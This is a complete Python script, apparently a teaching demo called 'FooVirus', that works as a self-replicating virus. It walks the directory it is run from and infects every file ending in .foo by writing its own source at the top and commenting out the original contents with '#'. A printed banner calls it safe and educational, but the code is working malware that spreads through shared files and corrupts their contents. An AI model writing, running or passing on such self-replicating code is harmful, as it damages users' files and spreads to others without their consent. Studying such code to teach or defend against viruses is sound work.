#!/usr/bin/env python

import os
import sys

def infect_files(directory):
    virus_code = get_virus_code()
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.foo'):
                filepath = os.path.join(root, file)
                with open(filepath, 'r+') as f:
                    file_content = f.readlines()
                    f.seek(0)
                    f.write(virus_code)
                    f.write('\n')
                    for line in file_content:
                        f.write('#' + line)
                    f.truncate()

def get_virus_code():
    with open(sys.argv[0], 'r') as virus_file:
        return virus_file.read()

if __name__ == "__main__":
    print("\nHELLO FROM FooVirus\n")
    print("This is a demonstration of how easy it is to write")
    print("a self-replicating program. This virus will infect")
    print("all files whose names end in .foo in the directory")
    print("in which you execute an infected file. If you send an")
    print("infected file to someone else and they execute it,")
    print("their .foo files will be damaged also.\n")
    print("Note that this is a safe virus and it is for educational")
    print("purposes only. The virus does not carry a harmful payload.")
    print("All it does is to print out this message and comment out")
    print("the code in .foo files.\n")

    infect_files('.')
